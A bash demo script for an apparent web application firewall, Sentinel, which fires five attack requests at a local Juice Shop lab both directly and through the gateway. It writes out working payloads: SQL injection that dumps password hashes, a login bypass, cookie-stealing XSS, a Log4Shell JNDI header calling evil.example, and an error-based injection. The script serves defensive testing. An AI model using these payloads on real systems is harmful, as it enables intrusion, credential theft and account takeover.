#!/usr/bin/env bash
# Sentinel quick demo: five attacks, each sent straight to Juice Shop and
# then through Sentinel. Watch the dashboard's Console while it runs.
#
#   bash lab/demo.sh          (the lab must be running: bash lab/start.sh)

DIRECT=${DIRECT:-http://localhost:3000}
GATEWAY=${GATEWAY:-http://localhost:8080}
DASHBOARD=${DASHBOARD:-http://localhost:9000}
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
cd "$(dirname "$0")/.." || exit 1

RED=$'\e[1;31m'; GREEN=$'\e[1;32m'; YELLOW=$'\e[1;33m'; CYAN=$'\e[1;36m'; DIM=$'\e[2m'; RESET=$'\e[0m'
code() { curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$@"; }

# attack NAME WHAT -- curl args (path last, without host)
attack() {
  local name=$1 what=$2; shift 3
  local path=${*: -1} args=("${@:1:$#-1}")
  printf "\n%s\n  %s\n  ${DIM}%s${RESET}\n" "${CYAN}▶ $name${RESET}" "$what" "$path"
  local d g
  d=$(code "${args[@]}" "$DIRECT$path")
  g=$(code "${args[@]}" "$GATEWAY$path")
  printf "  ${RED}without Sentinel:${RESET} HTTP %s, the shop processed it\n" "$d"
  case "$g" in
    4??) printf "  ${GREEN}with Sentinel:    HTTP %s, stopped before the shop saw it${RESET}\n" "$g" ;;
    *)   printf "  ${YELLOW}with Sentinel:    HTTP %s (expected a block)${RESET}\n" "$g" ;;
  esac
}

run_all() {
  attack "SQL injection" "Reads every user's email and password hash from the database." -- \
    "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--"
  attack "Login bypass" "Logs in as the admin without a password." -- \
    -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}" "/rest/user/login"
  attack "Cross-site scripting" "Plants a script in the page of anyone who opens the link." -- \
    "/rest/products/search?q=%3Ciframe%20src%3D%22javascript:alert(document.cookie)%22%3E"
  attack "Log4Shell (CVE-2021-44228)" "The famous Java exploit; Sentinel has a virtual patch for it." -- \
    -H 'User-Agent: ${jndi:ldap://evil.example/a}' "/"
  attack "Caught by the ML model" "An obfuscated attack no single rule describes; the model scores it." -- \
    "/rest/products/search?q=1%20AND%20extractvalue(1,concat(0x7e,(select%20database())))"
  printf "\n  Normal shopping still works through Sentinel: HTTP %s\n" "$(code "$GATEWAY/rest/products/search?q=apple")"
}

# Open a page in the default browser. On Windows (Git Bash) "start" is not
# reliable with links holding "#" and "&", so ask Windows directly.
open_url() {
  if command -v rundll32 >/dev/null 2>&1; then rundll32 url.dll,FileProtocolHandler "$1"
  elif command -v open >/dev/null 2>&1; then open "$1"
  elif command -v xdg-open >/dev/null 2>&1; then xdg-open "$1" >/dev/null 2>&1
  else echo "  Open $1"; fi
}

# The one-time link to create the first admin ("" once an admin exists).
setup_link() {
  [ "$(curl -s --max-time 3 "$DASHBOARD/__sentinel/setup/api")" = '{"active":true}' ] || return 0
  docker compose logs gateway 2>/dev/null | grep -o 'http[^" ]*/__sentinel/setup#[^ "]*' | tail -1 | sed "s|http://[^/]*|$DASHBOARD|"
}

# First thing: open the browser where you need to be.
link=$(setup_link)
if [ -n "$link" ]; then
  printf "\n  %s\n  %s\n" "${CYAN}First run: create your admin account in the browser window that just opened.${RESET}" "Setup link (works once): $link"
  open_url "$link"
else
  open_url "$DASHBOARD/__sentinel/dashboard#console"
fi

while true; do
  printf "\n%s\n" "${CYAN}SENTINEL · quick demo${RESET}"
  printf "  1  Run the five attacks\n  D  Open the dashboard (%s)\n  L  Show the setup link (first login)\n  Q  Quit (stops the lab and closes this window)\n  > " "$DASHBOARD"
  read -r c
  case "$c" in
    1) run_all ;;
    [dD]) open_url "$DASHBOARD/__sentinel/dashboard#console" ;;
    [lL]) link=$(setup_link); if [ -n "$link" ]; then echo "  $link"; open_url "$link"; else echo "  No setup link: the admin account already exists."; fi ;;
    [qQ]) printf "  Stopping the lab (your account, settings and history are kept)...
"
          docker compose stop >/dev/null 2>&1 && printf "  %s
" "${GREEN}Stopped. Double-click Start Sentinel.bat to start it again.${RESET}"
          sleep 2; exit 0 ;;
  esac
done
